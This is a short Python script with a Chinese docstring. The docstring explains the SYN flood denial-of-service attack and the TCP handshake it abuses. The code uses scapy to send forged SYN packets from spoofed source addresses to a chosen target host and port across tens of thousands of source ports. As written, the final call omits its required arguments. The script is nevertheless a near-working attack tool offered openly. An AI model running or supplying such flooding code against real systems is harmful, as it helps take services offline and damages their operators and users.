"""
SYN泛洪攻击(SYN Flood)是一种比较常用的DoS方式之一。
通过发送大量伪造的 Tcp 连接请求，使被攻击主机资源耗尽(通常是 CPU 满负荷或者内存不足) 的攻击方式。

我们都知道建立 Tcp 连接需要完成三次握手。
正常情况下客户端首先向服务端发送SYN报文，
随后服务端回以 SYN+ACK 报文到达客户端，
最后客户端向服务端发送 ACK 报文完成三次握手。

而SYN泛洪攻击则是客户端向服务器发送SYN报文之后就不再响应服务器回应的报文。
由于服务器在处理 TCP 请求时，会在协议栈留一块缓冲区来存储握手的过程，
当然如果超过一定的时间内没有接收到客户端的报文，
本次连接在协议栈中存储的数据将会被丢弃。
攻击者如果利用这段时间发送大量的连接请求，全部挂起在半连接状态。
这样将不断消耗服务器资源，直到拒绝服务。

"""


import random
from scapy.all import *

def synFlood(tgt,dPort):
    srcList = ['201.1.1.2','10.1.1.102','69.1.1.2','125.130.5.199']
    for sPort in range(1024,65535):
        index = random.randrange(4)
        ipLayer = IP(src=srcList[index], dst=tgt)
        tcpLayer = TCP(sport=sPort, dport=dPort,flags="S")
        packet = ipLayer / tcpLayer
        send(packet)

synFlood()